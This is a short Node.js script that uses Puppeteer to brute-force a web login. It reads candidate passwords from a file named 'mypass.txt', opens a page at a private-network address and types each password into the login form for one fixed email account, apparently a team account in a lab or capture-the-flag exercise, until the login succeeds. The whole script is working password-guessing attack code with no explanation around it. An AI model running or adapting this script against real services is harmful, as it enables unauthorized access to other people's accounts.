var fs = require('fs');
var array = fs.readFileSync('mypass.txt').toString().split("\n");
const puppeteer=require('puppeteer');
console.log(array);
(async ()=>{
    const browser = await puppeteer.launch({headless : false});
    const page = await browser.newPage();
    await page.goto("http://192.168.2.5/");
    await page.click("div .btn",{delay : 20});
    let counter=0;
    while(page.url()==='http://192.168.2.5/login' && counter<array.length){
        try{
            await page.waitForSelector("#login-email",{delay : 50});
            await page.waitForSelector("#login-password",{delay : 50});
            await page.type('#login-email','team27@gmail.com',{delay : 50});
            await page.type('#login-password',array[counter],{delay : 50});
        }
        catch{
            break;
        }
        if(page.url()==='http://192.168.2.5/login')
            await page.click('.btn-login');
        counter++;
    }
    
    //await browser.close();
})();
